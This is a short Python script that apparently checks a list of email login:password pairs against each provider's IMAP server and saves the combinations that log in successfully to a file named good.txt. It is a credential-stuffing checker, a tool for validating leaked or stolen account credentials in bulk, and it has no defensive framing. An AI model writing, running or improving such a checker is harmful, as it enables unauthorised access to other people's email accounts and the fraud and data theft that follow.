#!/usr/bin/python3
# -*- coding: UTF-8 -*-

import imaplib
import argparse
import sys
import os.path


def create_parser ():
    parser = argparse.ArgumentParser()
    parser.add_argument('inputDirectory',help='Path to the input directory.')
 
    return parser


def mail_auth(login,password,file_path):
    print('%s:%s' % (login,password))
    try:
        server = login.split('@')[1]
        mail = imaplib.IMAP4_SSL('imap.'+server)
        mail.login(login,password)
        print('good')
        with open(file_path,'a') as f: # Сreate good.txt in script directory
            f.write('%s:%s\n' % (login,password))
    except:
        pass

def main():

    file_path = os.path.join(os.path.dirname(os.path.realpath(__file__)),'good.txt') # Create absolute path for good.txt
    parser = create_parser()
    namespace = parser.parse_args(sys.argv[1:])

    with open(namespace.inputDirectory,'r') as f_read: # Check log:pass line by line
        for line in f_read:
            try:
                account = line.strip() # Get data and destroy \n
                login = account.split(':')[0]
                password = account.split(':')[1]
                mail_auth(login,password,file_path)
            except IndexError:
                continue

if __name__ == '__main__':
    main()